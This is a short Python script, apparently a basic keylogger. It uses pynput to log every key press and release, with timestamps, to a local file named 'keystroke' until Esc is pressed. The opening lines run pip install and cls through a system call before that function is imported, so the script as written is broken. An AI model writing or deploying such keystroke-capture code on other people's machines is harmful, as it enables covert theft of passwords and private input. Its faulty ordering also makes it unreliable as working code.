syst('pip install pynput')
syst('cls')

from pynput.keyboard import Key, Listener
from os import system as syst
import logging

logging.basicConfig(filename='keystroke' , level = logging.DEBUG , format = '%(asctime)s : %(message)s')

def on_press(key) :
	logging.info('\t'+str(key))

def on_release(key) :
	logging.info('\t'*4+str(key))
	if key == Key.esc :
		return False

with Listener(on_press=on_press,on_release=on_release) as listener :
	listener.join()
